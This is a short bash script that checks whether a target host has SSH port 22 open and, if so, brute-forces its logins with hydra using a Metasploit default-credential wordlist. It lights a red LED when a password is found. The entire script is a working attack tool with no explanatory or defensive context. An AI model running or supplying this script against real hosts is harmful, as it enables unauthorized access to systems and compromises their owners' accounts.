#!/bin/bash

WAIT=1
DPORT=22

if nc -nw $WAIT $1 $DPORT < /dev/null 2> /dev/null; then
	echo 'bruteforcing ssh'
	if hydra -C /usr/share/wordlists/metasploit/piata_ssh_userpass.txt "ssh://$1" | grep 'password:'; then
		led red on 2> /dev/null
	fi
fi